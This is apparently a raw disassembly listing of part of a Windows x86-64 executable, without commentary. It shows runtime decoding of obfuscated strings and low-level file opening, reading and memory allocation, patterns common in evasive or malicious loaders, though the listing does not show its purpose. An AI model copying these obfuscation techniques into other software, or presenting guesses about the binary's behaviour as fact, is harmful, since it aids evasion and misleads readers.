   14000615d:	0f 84 df 1b 00 00    	je     0x140007d42
   140006163:	80 3d fa d1 2b 00 00 	cmpb   $0x0,0x2bd1fa(%rip)        # 0x1402c3364
   14000616a:	74 47                	je     0x1400061b3
   14000616c:	66 0f 6f 05 dc d1 2b 	movdqa 0x2bd1dc(%rip),%xmm0        # 0x1402c3350
   140006173:	00 
   140006174:	66 0f fd 05 84 58 00 	paddw  0x5884(%rip),%xmm0        # 0x14000ba00
   14000617b:	00 
   14000617c:	66 0f db 05 9c 54 00 	pand   0x549c(%rip),%xmm0        # 0x14000b620
   140006183:	00 
   140006184:	66 0f 7f 05 c4 d1 2b 	movdqa %xmm0,0x2bd1c4(%rip)        # 0x1402c3350
   14000618b:	00 
   14000618c:	66 0f 6f 05 cc d1 2b 	movdqa 0x2bd1cc(%rip),%xmm0        # 0x1402c3360
   140006193:	00 
   140006194:	66 0f fd 05 74 58 00 	paddw  0x5874(%rip),%xmm0        # 0x14000ba10
   14000619b:	00 
   14000619c:	66 0f db 05 ec 54 00 	pand   0x54ec(%rip),%xmm0        # 0x14000b690
   1400061a3:	00 
   1400061a4:	66 0f 7e 05 b4 d1 2b 	movd   %xmm0,0x2bd1b4(%rip)        # 0x1402c3360
   1400061ab:	00 
   1400061ac:	c6 05 b1 d1 2b 00 00 	movb   $0x0,0x2bd1b1(%rip)        # 0x1402c3364
   1400061b3:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   1400061ba:	00 00 00 00 
   1400061be:	48 8d 1d 8b d1 2b 00 	lea    0x2bd18b(%rip),%rbx        # 0x1402c3350
   1400061c5:	48 89 d9             	mov    %rbx,%rcx
   1400061c8:	e8 b3 3d 00 00       	call   0x140009f80
   1400061cd:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400061d4:	01 c0                	add    %eax,%eax
   1400061d6:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   1400061dd:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   1400061e4:	48 89 9d 48 17 00 00 	mov    %rbx,0x1748(%rbp)
   1400061eb:	48 8b 8d 00 17 00 00 	mov    0x1700(%rbp),%rcx
   1400061f2:	4c 8d b5 38 17 00 00 	lea    0x1738(%rbp),%r14
   1400061f9:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400061fe:	c7 44 24 20 00 02 00 	movl   $0x200,0x20(%rsp)
   140006205:	00 
   140006206:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   14000620d:	4c 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%r9
   140006214:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000621a:	e8 89 b3 ff ff       	call   0x1400015a8
   14000621f:	85 c0                	test   %eax,%eax
   140006221:	78 25                	js     0x140006248
   140006223:	48 8d 95 5c 10 00 00 	lea    0x105c(%rbp),%rdx
   14000622a:	44 8b 85 58 10 00 00 	mov    0x1058(%rbp),%r8d
   140006231:	41 d1 e8             	shr    $1,%r8d
   140006234:	48 8d 8d 30 0c 00 00 	lea    0xc30(%rbp),%rcx
   14000623b:	e8 d0 3d 00 00       	call   0x14000a010
   140006240:	85 c0                	test   %eax,%eax
   140006242:	0f 84 39 07 00 00    	je     0x140006981
   140006248:	48 8b 8d 00 17 00 00 	mov    0x1700(%rbp),%rcx
   14000624f:	e8 0a b2 ff ff       	call   0x14000145e
   140006254:	80 3d 39 d0 2b 00 00 	cmpb   $0x0,0x2bd039(%rip)        # 0x1402c3294
   14000625b:	0f 84 f4 19 00 00    	je     0x140007c55
   140006261:	80 3d b2 da 2b 00 00 	cmpb   $0x0,0x2bdab2(%rip)        # 0x1402c3d1a
   140006268:	74 78                	je     0x1400062e2
   14000626a:	66 0f 6f 05 be 57 00 	movdqa 0x57be(%rip),%xmm0        # 0x14000ba30
   140006271:	00 
   140006272:	66 0f 6f 0d 76 da 2b 	movdqa 0x2bda76(%rip),%xmm1        # 0x1402c3cf0
   140006279:	00 
   14000627a:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000627e:	66 0f 6f 15 9a 53 00 	movdqa 0x539a(%rip),%xmm2        # 0x14000b620
   140006285:	00 
   140006286:	66 0f db ca          	pand   %xmm2,%xmm1
   14000628a:	66 0f 7f 0d 5e da 2b 	movdqa %xmm1,0x2bda5e(%rip)        # 0x1402c3cf0
   140006291:	00 
   140006292:	66 0f fd 05 66 da 2b 	paddw  0x2bda66(%rip),%xmm0        # 0x1402c3d00
   140006299:	00 
   14000629a:	66 0f db c2          	pand   %xmm2,%xmm0
   14000629e:	66 0f 7f 05 5a da 2b 	movdqa %xmm0,0x2bda5a(%rip)        # 0x1402c3d00
   1400062a5:	00 
   1400062a6:	f3 0f 7e 05 62 da 2b 	movq   0x2bda62(%rip),%xmm0        # 0x1402c3d10
   1400062ad:	00 
   1400062ae:	66 0f fd 05 8a 57 00 	paddw  0x578a(%rip),%xmm0        # 0x14000ba40
   1400062b5:	00 
   1400062b6:	66 0f db 05 a2 53 00 	pand   0x53a2(%rip),%xmm0        # 0x14000b660
   1400062bd:	00 
   1400062be:	66 0f d6 05 4a da 2b 	movq   %xmm0,0x2bda4a(%rip)        # 0x1402c3d10
   1400062c5:	00 
   1400062c6:	b8 f9 00 00 00       	mov    $0xf9,%eax
   1400062cb:	03 05 47 da 2b 00    	add    0x2bda47(%rip),%eax        # 0x1402c3d18
   1400062d1:	0f b6 c0             	movzbl %al,%eax
   1400062d4:	66 89 05 3d da 2b 00 	mov    %ax,0x2bda3d(%rip)        # 0x1402c3d18
   1400062db:	c6 05 38 da 2b 00 00 	movb   $0x0,0x2bda38(%rip)        # 0x1402c3d1a
   1400062e2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400062e7:	4c 8d 0d 02 da 2b 00 	lea    0x2bda02(%rip),%r9        # 0x1402c3cf0
   1400062ee:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400062f5:	b1 01                	mov    $0x1,%cl
   1400062f7:	49 89 f8             	mov    %rdi,%r8
   1400062fa:	e8 f1 ca ff ff       	call   0x140002df0
   1400062ff:	80 3d 8f cf 2b 00 00 	cmpb   $0x0,0x2bcf8f(%rip)        # 0x1402c3295
   140006306:	0f 84 7a 19 00 00    	je     0x140007c86
   14000630c:	80 3d 6f da 2b 00 00 	cmpb   $0x0,0x2bda6f(%rip)        # 0x1402c3d82
   140006313:	0f 84 b6 00 00 00    	je     0x1400063cf
   140006319:	66 0f 6f 05 1f 55 00 	movdqa 0x551f(%rip),%xmm0        # 0x14000b840
   140006320:	00 
   140006321:	66 0f 6f 0d f7 d9 2b 	movdqa 0x2bd9f7(%rip),%xmm1        # 0x1402c3d20
   140006328:	00 
   140006329:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000632d:	66 0f 6f 15 eb 52 00 	movdqa 0x52eb(%rip),%xmm2        # 0x14000b620
   140006334:	00 
   140006335:	66 0f db ca          	pand   %xmm2,%xmm1
   140006339:	66 0f 7f 0d df d9 2b 	movdqa %xmm1,0x2bd9df(%rip)        # 0x1402c3d20
   140006340:	00 
   140006341:	66 0f 6f 0d e7 d9 2b 	movdqa 0x2bd9e7(%rip),%xmm1        # 0x1402c3d30
   140006348:	00 
   140006349:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000634d:	66 0f db ca          	pand   %xmm2,%xmm1
   140006351:	66 0f 7f 0d d7 d9 2b 	movdqa %xmm1,0x2bd9d7(%rip)        # 0x1402c3d30
   140006358:	00 
   140006359:	66 0f 6f 0d df d9 2b 	movdqa 0x2bd9df(%rip),%xmm1        # 0x1402c3d40
   140006360:	00 
   140006361:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006365:	66 0f db ca          	pand   %xmm2,%xmm1
   140006369:	66 0f 7f 0d cf d9 2b 	movdqa %xmm1,0x2bd9cf(%rip)        # 0x1402c3d40
   140006370:	00 
   140006371:	66 0f 6f 0d d7 d9 2b 	movdqa 0x2bd9d7(%rip),%xmm1        # 0x1402c3d50
   140006378:	00 
   140006379:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000637d:	66 0f db ca          	pand   %xmm2,%xmm1
   140006381:	66 0f 7f 0d c7 d9 2b 	movdqa %xmm1,0x2bd9c7(%rip)        # 0x1402c3d50
   140006388:	00 
   140006389:	66 0f 6f 0d cf d9 2b 	movdqa 0x2bd9cf(%rip),%xmm1        # 0x1402c3d60
   140006390:	00 
   140006391:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006395:	66 0f db ca          	pand   %xmm2,%xmm1
   140006399:	66 0f 7f 0d bf d9 2b 	movdqa %xmm1,0x2bd9bf(%rip)        # 0x1402c3d60
   1400063a0:	00 
   1400063a1:	66 0f fd 05 c7 d9 2b 	paddw  0x2bd9c7(%rip),%xmm0        # 0x1402c3d70
   1400063a8:	00 
   1400063a9:	66 0f db c2          	pand   %xmm2,%xmm0
   1400063ad:	66 0f 7f 05 bb d9 2b 	movdqa %xmm0,0x2bd9bb(%rip)        # 0x1402c3d70
   1400063b4:	00 
   1400063b5:	8b 05 c5 d9 2b 00    	mov    0x2bd9c5(%rip),%eax        # 0x1402c3d80
   1400063bb:	83 c0 69             	add    $0x69,%eax
   1400063be:	0f b6 c0             	movzbl %al,%eax
   1400063c1:	66 89 05 b8 d9 2b 00 	mov    %ax,0x2bd9b8(%rip)        # 0x1402c3d80
   1400063c8:	c6 05 b3 d9 2b 00 00 	movb   $0x0,0x2bd9b3(%rip)        # 0x1402c3d82
   1400063cf:	48 8d 85 30 0c 00 00 	lea    0xc30(%rbp),%rax
   1400063d6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400063db:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400063e0:	4c 8d 0d 39 d9 2b 00 	lea    0x2bd939(%rip),%r9        # 0x1402c3d20
   1400063e7:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400063ee:	b1 01                	mov    $0x1,%cl
   1400063f0:	49 89 f8             	mov    %rdi,%r8
   1400063f3:	e8 f8 c9 ff ff       	call   0x140002df0
   1400063f8:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   1400063ff:	48 8d 95 30 0c 00 00 	lea    0xc30(%rbp),%rdx
   140006406:	e8 f5 3b 00 00       	call   0x14000a000
   14000640b:	85 c0                	test   %eax,%eax
   14000640d:	0f 84 83 03 00 00    	je     0x140006796
   140006413:	48 8d b5 50 10 00 00 	lea    0x1050(%rbp),%rsi
   14000641a:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140006420:	48 89 f1             	mov    %rsi,%rcx
   140006423:	31 d2                	xor    %edx,%edx
   140006425:	e8 36 3c 00 00       	call   0x14000a060
   14000642a:	80 3d 70 ce 2b 00 00 	cmpb   $0x0,0x2bce70(%rip)        # 0x1402c32a1
   140006431:	0f 84 51 19 00 00    	je     0x140007d88
   140006437:	80 3d 14 e0 2b 00 00 	cmpb   $0x0,0x2be014(%rip)        # 0x1402c4452
   14000643e:	74 3c                	je     0x14000647c
   140006440:	f3 0f 7e 05 00 e0 2b 	movq   0x2be000(%rip),%xmm0        # 0x1402c4448
   140006447:	00 
   140006448:	66 0f fd 05 00 56 00 	paddw  0x5600(%rip),%xmm0        # 0x14000ba50
   14000644f:	00 
   140006450:	66 0f db 05 08 52 00 	pand   0x5208(%rip),%xmm0        # 0x14000b660
   140006457:	00 
   140006458:	66 0f d6 05 e8 df 2b 	movq   %xmm0,0x2bdfe8(%rip)        # 0x1402c4448
   14000645f:	00 
   140006460:	b8 c5 00 00 00       	mov    $0xc5,%eax
   140006465:	03 05 e5 df 2b 00    	add    0x2bdfe5(%rip),%eax        # 0x1402c4450
   14000646b:	0f b6 c0             	movzbl %al,%eax
   14000646e:	66 89 05 db df 2b 00 	mov    %ax,0x2bdfdb(%rip)        # 0x1402c4450
   140006475:	c6 05 d6 df 2b 00 00 	movb   $0x0,0x2bdfd6(%rip)        # 0x1402c4452
   14000647c:	48 8d 15 c5 df 2b 00 	lea    0x2bdfc5(%rip),%rdx        # 0x1402c4448
   140006483:	48 89 f1             	mov    %rsi,%rcx
   140006486:	e8 e5 3a 00 00       	call   0x140009f70
   14000648b:	48 8d 95 20 0a 00 00 	lea    0xa20(%rbp),%rdx
   140006492:	48 89 f1             	mov    %rsi,%rcx
   140006495:	e8 c6 3a 00 00       	call   0x140009f60
   14000649a:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   1400064a1:	00 00 00 00 
   1400064a5:	48 89 f1             	mov    %rsi,%rcx
   1400064a8:	e8 d3 3a 00 00       	call   0x140009f80
   1400064ad:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400064b4:	01 c0                	add    %eax,%eax
   1400064b6:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   1400064bd:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   1400064c4:	48 89 b5 48 17 00 00 	mov    %rsi,0x1748(%rbp)
   1400064cb:	0f 57 f6             	xorps  %xmm6,%xmm6
   1400064ce:	0f 29 b5 70 14 00 00 	movaps %xmm6,0x1470(%rbp)
   1400064d5:	0f 29 b5 80 14 00 00 	movaps %xmm6,0x1480(%rbp)
   1400064dc:	c7 85 70 14 00 00 30 	movl   $0x30,0x1470(%rbp)
   1400064e3:	00 00 00 
   1400064e6:	c7 85 88 14 00 00 40 	movl   $0x40,0x1488(%rbp)
   1400064ed:	00 00 00 
   1400064f0:	48 8d 85 40 17 00 00 	lea    0x1740(%rbp),%rax
   1400064f7:	48 89 85 80 14 00 00 	mov    %rax,0x1480(%rbp)
   1400064fe:	0f 29 b5 90 14 00 00 	movaps %xmm6,0x1490(%rbp)
   140006505:	48 c7 85 38 17 00 00 	movq   $0x0,0x1738(%rbp)
   14000650c:	00 00 00 00 
   140006510:	0f 29 b5 00 17 00 00 	movaps %xmm6,0x1700(%rbp)
   140006517:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   14000651e:	00 
   14000651f:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140006526:	00 
   140006527:	48 8d 8d 38 17 00 00 	lea    0x1738(%rbp),%rcx
   14000652e:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006535:	48 8d b5 00 17 00 00 	lea    0x1700(%rbp),%rsi
   14000653c:	ba 00 00 10 80       	mov    $0x80100000,%edx
   140006541:	49 89 f1             	mov    %rsi,%r9
   140006544:	e8 24 af ff ff       	call   0x14000146d
   140006549:	0f 29 b5 10 17 00 00 	movaps %xmm6,0x1710(%rbp)
   140006550:	48 c7 85 20 17 00 00 	movq   $0x0,0x1720(%rbp)
   140006557:	00 00 00 00 
   14000655b:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   140006562:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   140006569:	00 
   14000656a:	4c 8d 85 10 17 00 00 	lea    0x1710(%rbp),%r8
   140006571:	48 89 f2             	mov    %rsi,%rdx
   140006574:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   14000657a:	e8 b1 af ff ff       	call   0x140001530
   14000657f:	85 c0                	test   %eax,%eax
   140006581:	0f 88 f8 1a 00 00    	js     0x14000807f
   140006587:	4c 8b b5 18 17 00 00 	mov    0x1718(%rbp),%r14
   14000658e:	48 c7 85 f0 16 00 00 	movq   $0x0,0x16f0(%rbp)
   140006595:	00 00 00 00 
   140006599:	4c 89 b5 90 16 00 00 	mov    %r14,0x1690(%rbp)
   1400065a0:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400065a7:	00 
   1400065a8:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   1400065af:	00 
   1400065b0:	48 8d 95 f0 16 00 00 	lea    0x16f0(%rbp),%rdx
   1400065b7:	31 db                	xor    %ebx,%ebx
   1400065b9:	4c 8d 8d 90 16 00 00 	lea    0x1690(%rbp),%r9
   1400065c0:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400065c7:	45 31 c0             	xor    %r8d,%r8d
   1400065ca:	e8 da ae ff ff       	call   0x1400014a9
   1400065cf:	85 c0                	test   %eax,%eax
   1400065d1:	78 50                	js     0x140006623
   1400065d3:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   1400065da:	48 8b 85 f0 16 00 00 	mov    0x16f0(%rbp),%rax
   1400065e1:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400065e5:	f3 0f 7f 44 24 38    	movdqu %xmm0,0x38(%rsp)
   1400065eb:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1400065f0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400065f5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400065fa:	31 d2                	xor    %edx,%edx
   1400065fc:	45 31 c0             	xor    %r8d,%r8d
   1400065ff:	45 31 c9             	xor    %r9d,%r9d
   140006602:	e8 39 ae ff ff       	call   0x140001440
   140006607:	85 c0                	test   %eax,%eax
   140006609:	78 18                	js     0x140006623
   14000660b:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   140006612:	e8 47 ae ff ff       	call   0x14000145e
   140006617:	48 8b 95 f0 16 00 00 	mov    0x16f0(%rbp),%rdx
   14000661e:	44 89 f3             	mov    %r14d,%ebx
   140006621:	eb 0e                	jmp    0x140006631
   140006623:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
   14000662a:	e8 2f ae ff ff       	call   0x14000145e
   14000662f:	31 d2                	xor    %edx,%edx
   140006631:	48 89 95 50 10 00 00 	mov    %rdx,0x1050(%rbp)
   140006638:	48 8d 8d 30 0c 00 00 	lea    0xc30(%rbp),%rcx
   14000663f:	41 89 d8             	mov    %ebx,%r8d
   140006642:	e8 09 cd ff ff       	call   0x140003350
   140006647:	48 c7 85 70 14 00 00 	movq   $0x0,0x1470(%rbp)
   14000664e:	00 00 00 00 
   140006652:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140006659:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006660:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140006667:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   14000666d:	e8 55 ae ff ff       	call   0x1400014c7
   140006672:	80 3d 1d cc 2b 00 00 	cmpb   $0x0,0x2bcc1d(%rip)        # 0x1402c3296
   140006679:	0f 84 4f 17 00 00    	je     0x140007dce
   14000667f:	80 3d 2c d7 2b 00 00 	cmpb   $0x0,0x2bd72c(%rip)        # 0x1402c3db2
   140006686:	74 56                	je     0x1400066de
   140006688:	66 0f 6f 05 d0 53 00 	movdqa 0x53d0(%rip),%xmm0        # 0x14000ba60
   14000668f:	00 
   140006690:	66 0f 6f 0d f8 d6 2b 	movdqa 0x2bd6f8(%rip),%xmm1        # 0x1402c3d90
   140006697:	00 
   140006698:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000669c:	66 0f 6f 15 7c 4f 00 	movdqa 0x4f7c(%rip),%xmm2        # 0x14000b620
   1400066a3:	00 
   1400066a4:	66 0f db ca          	pand   %xmm2,%xmm1
   1400066a8:	66 0f 7f 0d e0 d6 2b 	movdqa %xmm1,0x2bd6e0(%rip)        # 0x1402c3d90
   1400066af:	00 
   1400066b0:	66 0f fd 05 e8 d6 2b 	paddw  0x2bd6e8(%rip),%xmm0        # 0x1402c3da0
   1400066b7:	00 
   1400066b8:	66 0f db c2          	pand   %xmm2,%xmm0
   1400066bc:	66 0f 7f 05 dc d6 2b 	movdqa %xmm0,0x2bd6dc(%rip)        # 0x1402c3da0
   1400066c3:	00 
   1400066c4:	8b 05 e6 d6 2b 00    	mov    0x2bd6e6(%rip),%eax        # 0x1402c3db0
   1400066ca:	83 c0 61             	add    $0x61,%eax
   1400066cd:	0f b6 c0             	movzbl %al,%eax
   1400066d0:	66 89 05 d9 d6 2b 00 	mov    %ax,0x2bd6d9(%rip)        # 0x1402c3db0
   1400066d7:	c6 05 d4 d6 2b 00 00 	movb   $0x0,0x2bd6d4(%rip)        # 0x1402c3db2
   1400066de:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400066e3:	4c 8d 0d a6 d6 2b 00 	lea    0x2bd6a6(%rip),%r9        # 0x1402c3d90
   1400066ea:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400066f1:	31 c9                	xor    %ecx,%ecx
   1400066f3:	49 89 f8             	mov    %rdi,%r8
   1400066f6:	e8 f5 c6 ff ff       	call   0x140002df0
   1400066fb:	80 3d 95 cb 2b 00 00 	cmpb   $0x0,0x2bcb95(%rip)        # 0x1402c3297
   140006702:	0f 84 f7 16 00 00    	je     0x140007dff
   140006708:	80 3d d9 d6 2b 00 00 	cmpb   $0x0,0x2bd6d9(%rip)        # 0x1402c3de8
   14000670f:	74 63                	je     0x140006774
   140006711:	66 0f 6f 05 57 53 00 	movdqa 0x5357(%rip),%xmm0        # 0x14000ba70
   140006718:	00 
   140006719:	66 0f 6f 0d 9f d6 2b 	movdqa 0x2bd69f(%rip),%xmm1        # 0x1402c3dc0
   140006720:	00 
   140006721:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006725:	66 0f 6f 15 f3 4e 00 	movdqa 0x4ef3(%rip),%xmm2        # 0x14000b620
   14000672c:	00 
   14000672d:	66 0f db ca          	pand   %xmm2,%xmm1
   140006731:	66 0f 7f 0d 87 d6 2b 	movdqa %xmm1,0x2bd687(%rip)        # 0x1402c3dc0
   140006738:	00 
   140006739:	66 0f fd 05 8f d6 2b 	paddw  0x2bd68f(%rip),%xmm0        # 0x1402c3dd0
   140006740:	00 
   140006741:	66 0f db c2          	pand   %xmm2,%xmm0
   140006745:	66 0f 7f 05 83 d6 2b 	movdqa %xmm0,0x2bd683(%rip)        # 0x1402c3dd0
   14000674c:	00 
   14000674d:	f3 0f 7e 05 8b d6 2b 	movq   0x2bd68b(%rip),%xmm0        # 0x1402c3de0
   140006754:	00 
   140006755:	66 0f fd 05 23 53 00 	paddw  0x5323(%rip),%xmm0        # 0x14000ba80
   14000675c:	00 
   14000675d:	66 0f db 05 fb 4e 00 	pand   0x4efb(%rip),%xmm0        # 0x14000b660
   140006764:	00 
   140006765:	66 0f d6 05 73 d6 2b 	movq   %xmm0,0x2bd673(%rip)        # 0x1402c3de0
   14000676c:	00 
   14000676d:	c6 05 74 d6 2b 00 00 	movb   $0x0,0x2bd674(%rip)        # 0x1402c3de8
   140006774:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006779:	4c 8d 0d 40 d6 2b 00 	lea    0x2bd640(%rip),%r9        # 0x1402c3dc0
   140006780:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140006787:	31 c9                	xor    %ecx,%ecx
   140006789:	49 89 f8             	mov    %rdi,%r8
   14000678c:	e8 5f c6 ff ff       	call   0x140002df0
   140006791:	e9 b4 08 00 00       	jmp    0x14000704a
   140006796:	80 3d fb ca 2b 00 00 	cmpb   $0x0,0x2bcafb(%rip)        # 0x1402c3298
   14000679d:	0f 84 8d 16 00 00    	je     0x140007e30
   1400067a3:	80 3d 82 d6 2b 00 00 	cmpb   $0x0,0x2bd682(%rip)        # 0x1402c3e2c
   1400067aa:	0f 84 da 00 00 00    	je     0x14000688a
   1400067b0:	f3 0f 7e 15 38 d6 2b 	movq   0x2bd638(%rip),%xmm2        # 0x1402c3df0
   1400067b7:	00 
   1400067b8:	66 0f 6f 05 d0 52 00 	movdqa 0x52d0(%rip),%xmm0        # 0x14000ba90
   1400067bf:	00 
   1400067c0:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400067c4:	66 0f 6f 0d 94 4e 00 	movdqa 0x4e94(%rip),%xmm1        # 0x14000b660
   1400067cb:	00 
   1400067cc:	66 0f db d1          	pand   %xmm1,%xmm2
   1400067d0:	f3 0f 7e 1d 20 d6 2b 	movq   0x2bd620(%rip),%xmm3        # 0x1402c3df8
   1400067d7:	00 
   1400067d8:	66 0f fd d8          	paddw  %xmm0,%xmm3
   1400067dc:	66 0f db d9          	pand   %xmm1,%xmm3
   1400067e0:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   1400067e4:	f3 0f 7f 15 04 d6 2b 	movdqu %xmm2,0x2bd604(%rip)        # 0x1402c3df0
   1400067eb:	00 
   1400067ec:	f3 0f 7e 15 0c d6 2b 	movq   0x2bd60c(%rip),%xmm2        # 0x1402c3e00
   1400067f3:	00 
   1400067f4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400067f8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400067fc:	f3 0f 7e 1d 04 d6 2b 	movq   0x2bd604(%rip),%xmm3        # 0x1402c3e08
   140006803:	00 
   140006804:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140006808:	66 0f db d9          	pand   %xmm1,%xmm3
   14000680c:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140006810:	f3 0f 7f 15 e8 d5 2b 	movdqu %xmm2,0x2bd5e8(%rip)        # 0x1402c3e00
   140006817:	00 
   140006818:	f3 0f 7e 15 f0 d5 2b 	movq   0x2bd5f0(%rip),%xmm2        # 0x1402c3e10
   14000681f:	00 
   140006820:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006824:	66 0f db d1          	pand   %xmm1,%xmm2
   140006828:	f3 0f 7e 1d e8 d5 2b 	movq   0x2bd5e8(%rip),%xmm3        # 0x1402c3e18
   14000682f:	00 
   140006830:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140006834:	66 0f db d9          	pand   %xmm1,%xmm3
   140006838:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   14000683c:	f3 0f 7f 15 cc d5 2b 	movdqu %xmm2,0x2bd5cc(%rip)        # 0x1402c3e10
   140006843:	00 
   140006844:	f3 0f 7e 15 d4 d5 2b 	movq   0x2bd5d4(%rip),%xmm2        # 0x1402c3e20
   14000684b:	00 
   14000684c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006850:	66 0f db d1          	pand   %xmm1,%xmm2
   140006854:	66 0f d6 15 c4 d5 2b 	movq   %xmm2,0x2bd5c4(%rip)        # 0x1402c3e20
   14000685b:	00 
   14000685c:	8b 05 c6 d5 2b 00    	mov    0x2bd5c6(%rip),%eax        # 0x1402c3e28
   140006862:	83 c0 43             	add    $0x43,%eax
   140006865:	0f b6 c0             	movzbl %al,%eax
   140006868:	66 89 05 b9 d5 2b 00 	mov    %ax,0x2bd5b9(%rip)        # 0x1402c3e28
   14000686f:	0f b7 05 b4 d5 2b 00 	movzwl 0x2bd5b4(%rip),%eax        # 0x1402c3e2a
   140006876:	83 c0 43             	add    $0x43,%eax
   140006879:	0f b6 c0             	movzbl %al,%eax
   14000687c:	66 89 05 a7 d5 2b 00 	mov    %ax,0x2bd5a7(%rip)        # 0x1402c3e2a
   140006883:	c6 05 a2 d5 2b 00 00 	movb   $0x0,0x2bd5a2(%rip)        # 0x1402c3e2c
   14000688a:	8b 85 34 17 00 00    	mov    0x1734(%rbp),%eax
   140006890:	88 44 24 38          	mov    %al,0x38(%rsp)
   140006894:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   140006899:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000689e:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400068a5:	00 00 
   1400068a7:	48 8d 0d 42 d5 2b 00 	lea    0x2bd542(%rip),%rcx        # 0x1402c3df0
   1400068ae:	48 8d 15 ab 77 00 00 	lea    0x77ab(%rip),%rdx        # 0x14000e060
   1400068b5:	41 b8 4c cd 00 00    	mov    $0xcd4c,%r8d
   1400068bb:	4d 89 e1             	mov    %r12,%r9
   1400068be:	e8 5d d3 ff ff       	call   0x140003c20
   1400068c3:	80 3d cf c9 2b 00 00 	cmpb   $0x0,0x2bc9cf(%rip)        # 0x1402c3299
   1400068ca:	0f 84 91 15 00 00    	je     0x140007e61
   1400068d0:	80 3d 65 d5 2b 00 00 	cmpb   $0x0,0x2bd565(%rip)        # 0x1402c3e3c
   1400068d7:	74 47                	je     0x140006920
   1400068d9:	f3 0f 7e 05 4f d5 2b 	movq   0x2bd54f(%rip),%xmm0        # 0x1402c3e30
   1400068e0:	00 
   1400068e1:	66 0f fd 05 b7 51 00 	paddw  0x51b7(%rip),%xmm0        # 0x14000baa0
   1400068e8:	00 
   1400068e9:	66 0f db 05 6f 4d 00 	pand   0x4d6f(%rip),%xmm0        # 0x14000b660
   1400068f0:	00 
   1400068f1:	66 0f d6 05 37 d5 2b 	movq   %xmm0,0x2bd537(%rip)        # 0x1402c3e30
   1400068f8:	00 
   1400068f9:	f3 0f 7e 05 37 d5 2b 	movq   0x2bd537(%rip),%xmm0        # 0x1402c3e38
   140006900:	00 
   140006901:	66 0f fd 05 a7 51 00 	paddw  0x51a7(%rip),%xmm0        # 0x14000bab0
   140006908:	00 
   140006909:	66 0f db 05 7f 4d 00 	pand   0x4d7f(%rip),%xmm0        # 0x14000b690
   140006910:	00 
   140006911:	66 0f 7e 05 1f d5 2b 	movd   %xmm0,0x2bd51f(%rip)        # 0x1402c3e38
   140006918:	00 
   140006919:	c6 05 1c d5 2b 00 00 	movb   $0x0,0x2bd51c(%rip)        # 0x1402c3e3c
   140006920:	48 8d 0d 09 d5 2b 00 	lea    0x2bd509(%rip),%rcx        # 0x1402c3e30
   140006927:	e8 54 36 00 00       	call   0x140009f80
   14000692c:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140006930:	0f 84 30 01 00 00    	je     0x140006a66
